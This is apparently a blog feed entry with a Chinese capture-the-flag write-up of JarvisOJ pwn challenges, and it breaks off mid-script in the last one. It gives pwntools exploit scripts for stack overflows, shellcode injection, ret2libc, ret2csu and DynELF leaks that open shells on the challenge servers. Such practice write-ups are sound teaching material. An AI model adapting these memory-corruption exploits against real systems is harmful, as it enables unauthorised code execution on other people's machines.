<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>KANGEL</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://j-kangel.github.io/"/>
  <updated>2019-06-10T14:59:10.403Z</updated>
  <id>https://j-kangel.github.io/</id>
  
  <author>
    <name>kangel</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>jarvisOJ解题记录之pwn</title>
    <link href="https://j-kangel.github.io/2019/05/19/jarvisOJ%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95%E4%B9%8Bpwn/"/>
    <id>https://j-kangel.github.io/2019/05/19/jarvisOJ解题记录之pwn/</id>
    <published>2019-05-19T15:44:26.000Z</published>
    <updated>2019-06-10T14:59:10.403Z</updated>
    
    <content type="html"><![CDATA[<h3 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h3><p>checksec,NX开启</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\1.JPG" alt=""></p><p>ida查看程序</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\2.JPG" alt=""></p><p>栈溢出，可以直接覆盖掉返回地址是程序直接执行callsystem函数从而拿到shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">tar = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">" 9881"</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x88</span> + p64(<span class="number">0x400596</span>)</span><br><span class="line">tar.send(payload)</span><br><span class="line">tar.interactive()</span><br></pre></td></tr></table></figure><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>checksec，没有开启NX</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\3.JPG" alt=""></p><p>IDA查看程序</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\4.JPG" alt=""></p><p>栈溢出，由于没有开启NX，可以直接在栈中写入shellcode。栈的首地址程序会打印出来，所以直接接收</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9877"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level1"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf = p.recvline()[<span class="number">14</span>:<span class="number">-2</span>]</span><br><span class="line">buf = int(buf,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(buf)</span><br><span class="line">payload = shellcode.ljust(<span class="number">140</span>,<span class="string">'a'</span>) + p32(buf)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>checksec，开启了NX</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\5.JPG" alt=""></p><p>IDA查看程序</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\6.JPG" alt=""></p><p>栈溢出，调用系统函数执行“/bin/sh”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9878"</span>)</span><br><span class="line">system_addr = <span class="number">0x08048320</span></span><br><span class="line">bin_sh = <span class="number">0x0804a024</span></span><br><span class="line">payload = flat([<span class="number">140</span>*<span class="string">'a'</span>,system_addr,<span class="string">'aaaa'</span>,bin_sh])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="level2（x64）"><a href="#level2（x64）" class="headerlink" title="level2（x64）"></a>level2（x64）</h3><p>IDA查看程序</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\25.JPG" alt=""></p><p>与上一题基本相同，需要注意的是64位程序与32位函数传参的不同。</p><p>32位：函数参数直接入栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_addr-&gt;ret_addr-&gt;参数n-&gt;参数n-1...</span><br></pre></td></tr></table></figure><p>64位：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前六个参数按顺序存储在寄存器rdi, rsi, rdx, rcx, r8, r9中</span><br><span class="line">数超过六个时，从第七个开始压入栈中</span><br></pre></td></tr></table></figure><p>这里调用system只需要一个参数“/bin/sh”，将它的地址填入rdi中即可。需要一次gadget</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\24.JPG" alt=""></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9882"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x4004c0</span></span><br><span class="line">bin_sh = <span class="number">0x600a90</span></span><br><span class="line">rdi_pop_addr = <span class="number">0x4006b3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + p64(rdi_pop_addr) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">"Input:"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>checksec</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\21.JPG" alt=""></p><p>IDA查看程序</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\22.JPG" alt=""></p><p>发现栈溢出，但是程序中没有可以直接利用的函数。但是有write函数，write函数可以输出write函数在got表中的地址，从而可以计算出system函数和“/bin/sh”的地址。</p><p>首先找到write函数的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">" pwn2.jarvisoj.com"</span>,<span class="string">"9879"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + <span class="string">'aaaa'</span> + p32(write_plt) + p32(vun_addr) +  p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9879"</span>)</span><br><span class="line"><span class="comment">#p = process("./level3")</span></span><br><span class="line">elf = ELF(<span class="string">"./level3"</span>)</span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">vun_addr = <span class="number">0x0804844b</span></span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + <span class="string">'aaaa'</span> + p32(write_plt) + p32(vun_addr) +  p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span> * <span class="number">140</span> + p32(system_addr) + <span class="string">"aaaa"</span>+ p32(binsh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="level3-x64"><a href="#level3-x64" class="headerlink" title="level3_x64"></a>level3_x64</h3><p>利用write函数泄露got表需要三个参数，在64位程序中，前三个参数分别存在rdi、rsi、rdx中，因此可以利用ret2csu。exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9883"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">write_plt = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">csu_front_addr = <span class="number">0x400690</span></span><br><span class="line">csu_end_addr = <span class="number">0x4006aa</span></span><br><span class="line">fakeebp = <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, last)</span>:</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdx=r13</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">csu(<span class="number">0</span>,<span class="number">1</span>,write_got,<span class="number">8</span>,write_got,<span class="number">1</span>,main_addr)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line"><span class="comment">#csu(0, 1, system_addr, 0, 0, binsh_addr, main_addr)  ##可能binsh_addr的内容超过8字节，打不通</span></span><br><span class="line">rdi = <span class="number">0x4006b3</span>  <span class="comment">#ROPgadget 得到</span></span><br><span class="line">payload2 = <span class="string">'a'</span> * <span class="number">0x80</span> + fakeebp</span><br><span class="line">payload2 += p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload2 += p64(system_addr) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>这道题是对无libc的栈溢出的考察，pwntools有Dynelf工具可以解决这类问题。具体攻击思路</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用write函数泄露出system的地址，将&quot;/bin/sh&quot;写入./bss段中，最后通过构造栈空间使system调用&quot;/bin/sh&quot;从而拿到shell</span><br></pre></td></tr></table></figure><p>首先利用write泄露system地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">"./level4"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x90</span> + p32(write_addr) + p32(vun_addr) + p32(<span class="number">1</span>) + p32(addr) + p32(<span class="number">4</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak,elf)</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br></pre></td></tr></table></figure><p>然后将”/bin/sh”写入.bss</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x90</span> + p32(read_addr) + p32(vun_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.senline(<span class="string">"/bin/sh\x00"</span>)</span><br></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9880"</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level4"</span>)</span><br><span class="line">write_addr = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">vun_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">bss_addr = elf.symbols[<span class="string">'__bss_start'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(bss_addr)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x8c</span> + p32(write_addr) + p32(vun_addr) + p32(<span class="number">1</span>) + p32(addr) + p32(<span class="number">4</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak,elf = ELF(<span class="string">"./level4"</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line">exit_addr = d.lookup(<span class="string">'exit'</span>,<span class="string">'libc'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">0x8c</span> + p32(read_addr) + p32(vun_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(system_addr) + p32(exit_addr) + p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接</p><p><a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85129</a></p><p><a href="https://www.freebuf.com/articles/system/193646.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/193646.html</a></p><h3 id="Test-Your-Memory"><a href="#Test-Your-Memory" class="headerlink" title="Test Your Memory"></a>Test Your Memory</h3><p>ret2libc，具体思路和方法与level2相似，exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>, <span class="string">"9876"</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x08048440</span></span><br><span class="line">catflag = <span class="number">0x080487e0</span></span><br><span class="line">main = <span class="number">0x080485d0</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x13</span>+<span class="number">4</span>) + p32(system) + p32(main) + p32(catflag)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Tell-Me-Something"><a href="#Tell-Me-Something" class="headerlink" title="Tell Me Something"></a>Tell Me Something</h3><p>checksec, 64位程序，NX开启</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\7.JPG" alt=""></p><p>ida查看</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\8.JPG" alt=""></p><p>栈溢出，用good_game地址覆盖掉函数返回地址，找出返回地址的位置</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\9.JPG" alt=""></p><p>查看main函数的汇编代码，没有rbp入栈，因此填充长度为0x88，编写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"pwn.jarvisoj.com"</span>, <span class="string">"9876"</span>)</span><br><span class="line"></span><br><span class="line">good_game = <span class="number">0x400620</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x88</span> + p64(good_game)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Smashes"><a href="#Smashes" class="headerlink" title="Smashes"></a>Smashes</h3><p>checksec，开启栈溢出保护，NX，fortify</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\10.JPG" alt=""></p><p>根据以上信息，这是一种基于stack smash的花式栈溢出。也就是：当发生栈溢出时，<code>__stack_chk_fail</code> 函数会打印出报错信息，报错信息中包含argv[0],而argv[0]是保存在栈中的，因此我们可以将想要的内容的地址覆盖掉argv[0]地址即可</p><p>ida查看程序</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\11.JPG" alt=""></p><p>_IO_getc函数会产生栈溢出，while循环中：flag会被overwrite，查看0x600d20的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000600D20 byte_600D20     db 50h                  ; DATA XREF: sub_4007E0+6Ew</span><br><span class="line">.data:0000000000600D21 aCtfHereSTheFla db &apos;CTF&#123;Here&apos;,27h,&apos;s the flag on server&#125;&apos;,0</span><br></pre></td></tr></table></figure><p>说明0x600d20是最初flag地址，但是该内容会被覆盖掉。这时候我们就需要利用一个技巧了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找。</span><br></pre></td></tr></table></figure><p>在memset处下断点:b *400873</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\12.JPG" alt=""></p><p>接下来找argv[0]的地址，在main函数处下断点:b *4006d0</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\13.JPG" alt=""></p><p>找到argv[0]地址0x7fffffffe288，查看canary保护的汇编代码</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\15.JPG" alt=""></p><p>在__IO_gets处下断点：b *40080e,然后计算argv[0]的偏移</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\16.JPG" alt=""></p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"pwn.jarvisoj.com"</span>, <span class="string">"9877"</span>)</span><br><span class="line"></span><br><span class="line">good_game = <span class="number">0x400d20</span></span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">536</span> + p64(good_game)</span><br><span class="line"><span class="comment">#payload = p64(good_game)*300   ##盲打</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"flag:"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Guess"><a href="#Guess" class="headerlink" title="Guess"></a>Guess</h3><p>checksec,NX开启</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\17.JPG" alt=""></p><p>IDA查看程序</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\18.JPG" alt=""></p><p>inbuf[4096],fgets(inbuf,4096,stdin),无栈溢出，继续查看is_flag_correct（inbuf）</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\19.JPG" alt=""></p><p>从后往前看，需要diff=0，因此需要flag和given_flag相等，given_flag与value相关，value值受bin_by_hex控制。整个程序逻辑为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入50个字符的十六进制，即100个十六进制字符。通过bin_by_hex，将100个十六进制字符转化为50个字符串存到given_flag中，最后比较真实的flag与given_flag的值。例如：输入&quot;313233&quot;，通过bin_by_hex就会生成&quot;123&quot;</span><br></pre></td></tr></table></figure><p>查看函数栈结构</p><p><img src="/2019/05/19/jarvisOJ解题记录之pwn/F:/blog\Hexo\source\_posts\jarvisOJ解题记录之pwn\20.JPG" alt=""></p><p>可以看到flag的地址比bin_by_hex低，再看value，发现漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">value1 = bin_by_hex[flag_hex[2*i]];   ##flag_hex为输入值</span><br><span class="line">value2 = bin_by_hex[flag_hex[2*i+1]];</span><br><span class="line">given_flag[i] = value2 | value1*16;</span><br></pre></td></tr></table></figure><p>flag_hex为char型，可以控制flag_hex为负数，这是value值可以为flag中的值，当value1=0时，given_flag就等于value2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">128 + 64 : -64</span><br><span class="line">128 + 64 + i :64+i</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">payload+=<span class="string">'0'</span></span><br><span class="line">payload+=chr(<span class="number">128</span>+i+<span class="number">64</span>)</span><br></pre></td></tr></table></figure><p>这样就可以使given_flag的值等于flag，但是还是无法知道具体的值，于是爆破，exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 